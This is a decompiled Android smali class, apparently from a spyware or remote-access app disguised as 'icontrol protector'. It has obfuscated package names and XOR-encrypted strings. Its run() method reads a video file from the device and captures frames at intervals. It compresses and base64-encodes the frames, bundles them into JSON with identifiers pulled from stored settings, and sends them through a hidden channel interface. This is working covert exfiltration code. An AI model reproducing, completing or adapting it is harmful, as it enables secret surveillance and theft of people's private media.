.class Lcom/icontrol/protector/LiveChat$b$a;
.super Ljava/lang/Thread;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/LiveChat$b;->f(Lntidisestablish/neumonoul/floccinaucinih/m70;Lntidisestablish/neumonoul/floccinaucinih/dy;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Lntidisestablish/neumonoul/floccinaucinih/m70;

.field final synthetic f:Lcom/icontrol/protector/LiveChat$b;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/LiveChat$b;Lntidisestablish/neumonoul/floccinaucinih/m70;)V
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/icontrol/protector/LiveChat$b$a;->f:Lcom/icontrol/protector/LiveChat$b;

    iput-object p2, p0, Lcom/icontrol/protector/LiveChat$b$a;->e:Lntidisestablish/neumonoul/floccinaucinih/m70;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 18

    move-object/from16 v1, p0

    :try_start_0
    iget-object v0, v1, Lcom/icontrol/protector/LiveChat$b$a;->f:Lcom/icontrol/protector/LiveChat$b;

    iget-object v0, v0, Lcom/icontrol/protector/LiveChat$b;->b:Landroid/content/Context;

    const/4 v2, 0x2

    new-array v3, v2, [B

    fill-array-data v3, :array_0

    const/16 v4, 0x8

    new-array v5, v4, [B

    fill-array-data v5, :array_1

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    const/4 v5, 0x0

    invoke-static {v0, v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v3, v1, Lcom/icontrol/protector/LiveChat$b$a;->f:Lcom/icontrol/protector/LiveChat$b;

    iget-object v3, v3, Lcom/icontrol/protector/LiveChat$b;->b:Landroid/content/Context;

    sget-object v5, Lntidisestablish/neumonoul/floccinaucinih/ab;->y:Ljava/lang/String;

    const/4 v6, 0x4

    new-array v7, v6, [B

    fill-array-data v7, :array_2

    new-array v8, v4, [B

    fill-array-data v8, :array_3

    invoke-static {v7, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {v3, v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/sq;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    if-nez v0, :cond_0

    return-void

    :cond_0
    iget-object v5, v1, Lcom/icontrol/protector/LiveChat$b$a;->f:Lcom/icontrol/protector/LiveChat$b;

    iget-object v5, v5, Lcom/icontrol/protector/LiveChat$b;->c:Ljava/lang/String;

    invoke-virtual {v5}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    new-instance v7, Ljava/io/File;

    invoke-virtual {v5}, Landroid/net/Uri;->getPath()Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v8, Landroid/media/MediaMetadataRetriever;

    invoke-direct {v8}, Landroid/media/MediaMetadataRetriever;-><init>()V

    invoke-virtual {v7}, Ljava/io/File;->getPath()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Landroid/media/MediaMetadataRetriever;->setDataSource(Ljava/lang/String;)V

    iget-object v9, v1, Lcom/icontrol/protector/LiveChat$b$a;->f:Lcom/icontrol/protector/LiveChat$b;

    iget-object v9, v9, Lcom/icontrol/protector/LiveChat$b;->b:Landroid/content/Context;

    invoke-static {v9, v5}, Landroid/media/MediaPlayer;->create(Landroid/content/Context;Landroid/net/Uri;)Landroid/media/MediaPlayer;

    move-result-object v5

    invoke-virtual {v5}, Landroid/media/MediaPlayer;->getDuration()I

    move-result v9

    const/16 v10, 0x9

    invoke-virtual {v8, v10}, Landroid/media/MediaMetadataRetriever;->extractMetadata(I)Ljava/lang/String;

    move-result-object v10

    const v11, 0xf4240

    :goto_0
    mul-int/lit16 v12, v9, 0x3e8

    if-ge v11, v12, :cond_7

    invoke-virtual {v7}, Ljava/io/File;->exists()Z

    move-result v12

    if-eqz v12, :cond_6

    iget-object v12, v1, Lcom/icontrol/protector/LiveChat$b$a;->f:Lcom/icontrol/protector/LiveChat$b;

    iget-object v12, v12, Lcom/icontrol/protector/LiveChat$b;->d:Ljava/lang/String;

    const/4 v13, 0x1

    new-array v14, v13, [B

    const/16 v15, 0x73

    const/4 v6, 0x0

    aput-byte v15, v14, v6

    new-array v15, v4, [B

    fill-array-data v15, :array_4

    invoke-static {v14, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v14

    invoke-virtual {v12, v14}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v12

    const/4 v14, 0x3

    if-nez v12, :cond_1

    mul-int/lit8 v12, v11, 0xa

    move-object/from16 v16, v5

    int-to-long v4, v12

    invoke-virtual {v8, v4, v5, v2}, Landroid/media/MediaMetadataRetriever;->getFrameAtTime(JI)Landroid/graphics/Bitmap;

    move-result-object v4

    sget-object v5, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    goto :goto_1

    :catch_0
    move-exception v0

    goto/16 :goto_4

    :cond_1
    move-object/from16 v16, v5

    int-to-long v4, v11

    invoke-virtual {v8, v4, v5, v14}, Landroid/media/MediaMetadataRetriever;->getFrameAtTime(JI)Landroid/graphics/Bitmap;

    move-result-object v4

    sget-object v5, Landroid/graphics/Bitmap$CompressFormat;->WEBP:Landroid/graphics/Bitmap$CompressFormat;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1
    if-eqz v4, :cond_5

    const/16 v12, 0x168

    const/16 v2, 0xe6

    :try_start_1
    invoke-static {v4, v12, v2, v6}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v2

    new-instance v4, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v4}, Ljava/io/ByteArrayOutputStream;-><init>()V

    const/16 v12, 0xa

    invoke-virtual {v2, v5, v12, v4}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    invoke-virtual {v4}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v4

    invoke-static {v4, v6}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x5

    new-array v15, v5, [B

    fill-array-data v15, :array_5
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4

    const/16 v12, 0x8

    :try_start_2
    new-array v5, v12, [B
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :try_start_3
    fill-array-data v5, :array_6

    invoke-static {v15, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    iget-object v15, v1, Lcom/icontrol/protector/LiveChat$b$a;->f:Lcom/icontrol/protector/LiveChat$b;

    iget-object v15, v15, Lcom/icontrol/protector/LiveChat$b;->d:Ljava/lang/String;

    new-array v12, v13, [B

    const/16 v17, 0x11

    aput-byte v17, v12, v6
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_4

    const/16 v6, 0x8

    :try_start_4
    new-array v13, v6, [B
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    move-object v6, v15

    :try_start_5
    fill-array-data v13, :array_7

    invoke-static {v12, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v6, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_2

    const/4 v6, 0x4

    new-array v5, v6, [B

    fill-array-data v5, :array_8

    const/16 v6, 0x8

    new-array v12, v6, [B

    fill-array-data v12, :array_9

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    :cond_2
    new-instance v6, Lorg/json/JSONObject;

    invoke-direct {v6}, Lorg/json/JSONObject;-><init>()V

    const/4 v12, 0x4

    new-array v13, v12, [B

    fill-array-data v13, :array_a
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4

    const/16 v12, 0x8

    :try_start_6
    new-array v15, v12, [B
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2

    move-object v12, v15

    :try_start_7
    fill-array-data v12, :array_b

    invoke-static {v13, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v6, v12, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v5, v14, [B

    fill-array-data v5, :array_c
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    const/16 v12, 0x8

    :try_start_8
    new-array v13, v12, [B
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_2

    :try_start_9
    fill-array-data v13, :array_d

    invoke-static {v5, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v6, v5, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v4, v14, [B

    fill-array-data v4, :array_e
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4

    const/16 v5, 0x8

    :try_start_a
    new-array v12, v5, [B
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_5

    :try_start_b
    fill-array-data v12, :array_f

    invoke-static {v4, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    iget-object v5, v1, Lcom/icontrol/protector/LiveChat$b$a;->f:Lcom/icontrol/protector/LiveChat$b;

    iget-object v5, v5, Lcom/icontrol/protector/LiveChat$b;->c:Ljava/lang/String;

    invoke-virtual {v6, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v4, v14, [B

    fill-array-data v4, :array_10
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_4

    const/16 v5, 0x8

    :try_start_c
    new-array v12, v5, [B
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_5

    :try_start_d
    fill-array-data v12, :array_11

    invoke-static {v4, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v6, v4, v10}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v6}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    new-array v6, v14, [B

    fill-array-data v6, :array_12
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_4

    const/16 v12, 0x8

    :try_start_e
    new-array v13, v12, [B
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_2

    :try_start_f
    fill-array-data v13, :array_13

    invoke-static {v6, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    iget-object v12, v1, Lcom/icontrol/protector/LiveChat$b$a;->f:Lcom/icontrol/protector/LiveChat$b;

    iget-object v12, v12, Lcom/icontrol/protector/LiveChat$b;->e:Ljava/lang/String;

    invoke-virtual {v5, v6, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v6, v14, [B

    fill-array-data v6, :array_14
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_4

    const/16 v12, 0x8

    :try_start_10
    new-array v13, v12, [B
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_2

    :try_start_11
    fill-array-data v13, :array_15

    invoke-static {v6, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v6, 0x5

    new-array v6, v6, [B

    fill-array-data v6, :array_16
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_4

    const/16 v12, 0x8

    :try_start_12
    new-array v13, v12, [B

    fill-array-data v13, :array_17

    invoke-static {v6, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    const/16 v13, 0xa

    new-array v13, v13, [B

    fill-array-data v13, :array_18

    new-array v15, v12, [B
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_2

    move-object v12, v15

    :try_start_13
    fill-array-data v12, :array_19

    invoke-static {v13, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v5, v6, v12}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const/4 v6, 0x4

    new-array v12, v6, [B

    fill-array-data v12, :array_1a
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_4

    const/16 v13, 0x8

    :try_start_14
    new-array v15, v13, [B

    fill-array-data v15, :array_1b

    invoke-static {v12, v15}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v12

    new-array v15, v14, [B

    fill-array-data v15, :array_1c

    new-array v6, v13, [B
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_3

    move-object v13, v15

    :try_start_15
    fill-array-data v6, :array_1d

    invoke-static {v13, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v12, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v6, v14, [B

    fill-array-data v6, :array_1e
    :try_end_15
    .catch Ljava/lang/Exception; {:try_start_15 .. :try_end_15} :catch_4

    const/16 v12, 0x8

    :try_start_16
    new-array v13, v12, [B
    :try_end_16
    .catch Ljava/lang/Exception; {:try_start_16 .. :try_end_16} :catch_2

    :try_start_17
    fill-array-data v13, :array_1f

    invoke-static {v6, v13}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v4, v14, [B

    fill-array-data v4, :array_20
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_4

    const/16 v6, 0x8

    :try_start_18
    new-array v12, v6, [B
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_1

    :try_start_19
    fill-array-data v12, :array_21

    invoke-static {v4, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v5, v4, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    iget-object v4, v1, Lcom/icontrol/protector/LiveChat$b$a;->e:Lntidisestablish/neumonoul/floccinaucinih/m70;

    if-eqz v4, :cond_8

    iget-object v6, v1, Lcom/icontrol/protector/LiveChat$b$a;->f:Lcom/icontrol/protector/LiveChat$b;

    iget-boolean v6, v6, Lcom/icontrol/protector/LiveChat$b;->a:Z

    if-eqz v6, :cond_3

    goto :goto_3

    :cond_3
    invoke-virtual {v5}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-interface {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/m70;->e(Ljava/lang/String;)Z

    invoke-virtual {v2}, Landroid/graphics/Bitmap;->recycle()V

    iget-object v2, v1, Lcom/icontrol/protector/LiveChat$b$a;->f:Lcom/icontrol/protector/LiveChat$b;

    iget-object v2, v2, Lcom/icontrol/protector/LiveChat$b;->d:Ljava/lang/String;

    const/4 v4, 0x1

    new-array v4, v4, [B

    const/16 v5, -0x76

    const/4 v6, 0x0

    aput-byte v5, v4, v6
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_4

    const/16 v5, 0x8

    :try_start_1a
    new-array v6, v5, [B

    fill-array-data v6, :array_22

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_4

    new-instance v2, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v4

    invoke-direct {v2, v4}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v4, Lcom/icontrol/protector/LiveChat$b$a$a;

    invoke-direct {v4, v1}, Lcom/icontrol/protector/LiveChat$b$a$a;-><init>(Lcom/icontrol/protector/LiveChat$b$a;)V

    const-wide/16 v12, 0x1388

    invoke-virtual {v2, v4, v12, v13}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_3

    :cond_4
    const-wide/16 v12, 0x1

    invoke-static {v12, v13}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_5

    goto :goto_2

    :catch_1
    move v5, v6

    goto :goto_2

    :catch_2
    move v5, v12

    goto :goto_2

    :catch_3
    move v5, v13

    goto :goto_2

    :catch_4
    :cond_5
    const/16 v5, 0x8

    goto :goto_2

    :cond_6
    move-object/from16 v16, v5

    move v5, v4

    :catch_5
    :goto_2
    const v2, 0x186a0

    add-int/2addr v11, v2

    move v4, v5

    move-object/from16 v5, v16

    const/4 v2, 0x2

    const/4 v6, 0x4

    goto/16 :goto_0

    :cond_7
    move-object/from16 v16, v5

    :cond_8
    :goto_3
    :try_start_1b
    invoke-virtual/range {v16 .. v16}, Landroid/media/MediaPlayer;->release()V
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_0

    goto :goto_5

    :goto_4
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_5
    return-void

    nop

    :array_0
    .array-data 1
        0x11t
        -0x60t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x58t
        -0x1ct
        0x0t
        0x6at
        -0x2bt
        0x22t
        -0x30t
        0x5bt
    .end array-data

    :array_2
    .array-data 1
        0xat
        0x6ft
        -0xct
        -0x45t
    .end array-data

    :array_3
    .array-data 1
        0x64t
        0x1at
        -0x68t
        -0x29t
        -0x3at
        -0x7bt
        -0x1ct
        -0x78t
    .end array-data

    :array_4
    .array-data 1
        0x42t
        0x6dt
        -0x2ft
        -0x5ct
        -0x69t
        0x35t
        -0x46t
        -0x6bt
    .end array-data

    :array_5
    .array-data 1
        0x63t
        -0x76t
        0x4et
        0x5at
        0x5ft
    .end array-data

    nop

    :array_6
    .array-data 1
        0x17t
        -0x1et
        0x3bt
        0x37t
        0x3dt
        0xbt
        -0x63t
        -0x63t
    .end array-data

    :array_7
    .array-data 1
        0x20t
        0x2at
        0x69t
        -0xdt
        -0x40t
        0x20t
        0x67t
        -0x54t
    .end array-data

    :array_8
    .array-data 1
        -0x70t
        -0x74t
        0x1dt
        0x1bt
    .end array-data

    :array_9
    .array-data 1
        -0x20t
        -0x6t
        0x74t
        0x7ft
        0x15t
        -0x6bt
        -0x72t
        -0x13t
    .end array-data

    :array_a
    .array-data 1
        -0x2ct
        0x25t
        0x6ft
        -0x61t
    .end array-data

    :array_b
    .array-data 1
        -0x60t
        0x5ct
        0x1ft
        -0x6t
        -0x5dt
        -0x59t
        0x5ft
        0x7bt
    .end array-data

    :array_c
    .array-data 1
        -0x33t
        -0x41t
        0x48t
    .end array-data

    :array_d
    .array-data 1
        -0x5ct
        -0x2et
        0x2ft
        0x5at
        -0x7ft
        -0x42t
        0x5at
        -0x2ct
    .end array-data

    :array_e
    .array-data 1
        0x7et
        -0x32t
        -0x29t
    .end array-data

    :array_f
    .array-data 1
        0xet
        -0x46t
        -0x41t
        -0x50t
        -0xct
        0x24t
        0x50t
        0x26t
    .end array-data

    :array_10
    .array-data 1
        0x50t
        0x21t
        0x6bt
    .end array-data

    :array_11
    .array-data 1
        0x34t
        0x54t
        0x19t
        0x36t
        0x5t
        -0x78t
        0x3at
        -0x77t
    .end array-data

    :array_12
    .array-data 1
        -0x16t
        0x6at
        -0x5at
    .end array-data

    :array_13
    .array-data 1
        -0x7dt
        0xet
        -0x40t
        0x27t
        -0x21t
        -0x3et
        0x61t
        0x64t
    .end array-data

    :array_14
    .array-data 1
        0x45t
        0x58t
        -0x39t
    .end array-data

    :array_15
    .array-data 1
        0x35t
        0x31t
        -0x5dt
        -0x2ft
        0x5bt
        0x5ft
        0x13t
        0x74t
    .end array-data

    :array_16
    .array-data 1
        0x7et
        -0x6bt
        -0x28t
        -0x7t
        -0x43t
    .end array-data

    nop

    :array_17
    .array-data 1
        0x17t
        -0x1ft
        -0x5ft
        -0x77t
        -0x28t
        0x24t
        0x6ft
        -0x35t
    .end array-data

    :array_18
    .array-data 1
        -0x63t
        0x18t
        0x2ct
        -0x5dt
        -0x23t
        0x77t
        -0x39t
        -0x55t
        -0x60t
        0x0t
    .end array-data

    nop

    :array_19
    .array-data 1
        -0x32t
        0x74t
        0x5et
        -0x4t
        -0x42t
        0x1bt
        -0x52t
        -0x32t
    .end array-data

    :array_1a
    .array-data 1
        -0x5dt
        -0x5at
        -0x14t
        0x3dt
    .end array-data

    :array_1b
    .array-data 1
        -0x30t
        -0x2dt
        -0x72t
        0x5et
        -0x7t
        -0x37t
        0x63t
        -0x18t
    .end array-data

    :array_1c
    .array-data 1
        -0x5t
        0x6bt
        0x7et
    .end array-data

    :array_1d
    .array-data 1
        -0x6at
        0x18t
        0x19t
        -0x15t
        -0x11t
        -0x5bt
        0x34t
        0x53t
    .end array-data

    :array_1e
    .array-data 1
        -0x19t
        -0x4at
        0x29t
    .end array-data

    :array_1f
    .array-data 1
        -0x76t
        -0x3bt
        0x4et
        -0x57t
        0x56t
        -0x33t
        0x13t
        0x3t
    .end array-data

    :array_20
    .array-data 1
        0x3ft
        -0x13t
        0x23t
    .end array-data

    :array_21
    .array-data 1
        0x5ct
        -0x7ct
        0x53t
        0x7dt
        0x56t
        -0x5bt
        0x7t
        0x56t
    .end array-data

    :array_22
    .array-data 1
        -0x45t
        0x7ct
        -0xct
        0x53t
        -0x5ct
        -0x41t
        0x57t
        0x49t
    .end array-data
.end method
